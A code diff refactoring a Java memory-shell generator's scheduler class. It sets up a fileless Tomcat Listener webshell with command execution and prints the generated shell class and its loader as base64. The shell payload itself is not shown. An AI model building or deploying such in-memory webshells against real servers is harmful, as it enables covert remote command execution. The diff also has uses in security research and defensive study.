@@ -1,9 +1,8 @@
-package com.ppp;
+package com.ppp.scheduler;
 
-import com.ppp.annotation.Builder;
-import com.ppp.annotation.MemShell;
-import com.ppp.annotation.MemShellFunction;
-import com.ppp.annotation.Middleware;
+import com.ppp.JavaClassHelper;
+import com.ppp.Printer;
+import com.ppp.annotation.*;
 import com.ppp.utils.maker.ClassUtils;
 import com.ppp.utils.maker.Encoder;
 
@@ -14,28 +13,30 @@ import java.util.List;
  * @author Whoopsunix
  * 内存马生成
  */
+@JavaClassHelperType(JavaClassHelperType.MemShell)
 public class MemShellScheduler {
     private static String builderPackageName = "com.ppp.middleware.builder";
     private static String loaderPackageName = "com.ppp.middleware.loader";
     private static String msPackageName = "com.ppp.middleware.memshell";
 
     public static void main(String[] args) throws Exception {
-        MemShellHelper memShellHelper = new MemShellHelper();
-        memShellHelper.setMiddleware(Middleware.Tomcat);
-        memShellHelper.setMemShell(MemShell.Listener);
-        memShellHelper.setMemShellFunction(MemShellFunction.Runtime);
+        JavaClassHelper javaClassHelper = new JavaClassHelper();
+        javaClassHelper.setJavaClassHelperType(JavaClassHelperType.MemShell);
+        javaClassHelper.setMiddleware(Middleware.Tomcat);
+        javaClassHelper.setMemShell(MemShell.Listener);
+        javaClassHelper.setMemShellFunction(MemShellFunction.Runtime);
 
         // 内存马信息
-        memShellHelper.setHEADER("xxx");
+        javaClassHelper.setHEADER("xxx");
 
 
-        build(memShellHelper);
+        build(javaClassHelper);
     }
 
-    public static byte[] build(MemShellHelper memShellHelper) throws Exception {
-        String middleware = memShellHelper.getMiddleware();
-        String memShell = memShellHelper.getMemShell();
-        String memShellFunction = memShellHelper.getMemShellFunction();
+    public static byte[] build(JavaClassHelper javaClassHelper) throws Exception {
+        String middleware = javaClassHelper.getMiddleware();
+        String memShell = javaClassHelper.getMemShell();
+        String memShellFunction = javaClassHelper.getMemShellFunction();
 
         /**
          * 获取 Builder
@@ -152,12 +153,12 @@ public class MemShellScheduler {
         Object loaderBuilder = loaderBuilderClass.newInstance();
         Object msBuilder = msBuilderClass.newInstance();
 
-        byte[] msJavaClassBytes = (byte[]) msMethod.invoke(msBuilder, msClass, memShellHelper);
+        byte[] msJavaClassBytes = (byte[]) msMethod.invoke(msBuilder, msClass, javaClassHelper);
         String msJavaClassBase64 = Encoder.base64encoder(msJavaClassBytes);
         Printer.greenInfo("ms:");
         Printer.greenInfo(msJavaClassBase64);
 
-        byte[] msLoaderJavaClassBytes = (byte[]) loaderMethod.invoke(loaderBuilder, loaderClass, msJavaClassBase64, memShellHelper);
+        byte[] msLoaderJavaClassBytes = (byte[]) loaderMethod.invoke(loaderBuilder, loaderClass, msJavaClassBase64, javaClassHelper);
         String b64 = Encoder.base64encoder(msLoaderJavaClassBytes);
         Printer.greenInfo("ms+loader:");
         Printer.greenInfo(b64);
